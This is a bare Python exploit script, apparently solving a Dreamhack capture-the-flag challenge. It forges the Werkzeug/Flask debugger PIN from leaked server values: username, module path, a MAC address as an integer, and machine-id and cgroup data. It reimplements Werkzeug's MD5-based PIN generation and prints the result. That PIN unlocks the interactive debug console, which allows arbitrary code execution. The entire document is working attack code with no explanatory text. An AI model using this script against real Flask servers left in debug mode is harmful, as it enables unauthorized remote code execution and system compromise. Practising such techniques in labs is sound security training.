import hashlib
from itertools import chain
probably_public_bits = [
    'dreamhack',
    # username
    'flask.app',
    # modname
    'Flask',
    # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/site-packages/flask/app.py'
    # getattr(mod, '__file__', None),
]

private_bits = [
    '187999308503297',
    'c31eea55a29431535ff01de94bdcf5cflibpod-c2a2461432080d7fa01b1a726975e6773013f25ad16acff1733005ce08e49df7'
    #'6ee02275-290a-4d87-8c5d-038b6d2617c9'
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
        h.update(bit)

h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(num[x: x + group_size].rjust(group_size, "0")
                          for x in range(0, len(num), group_size))
            break
        else:
            rv = num

print(rv)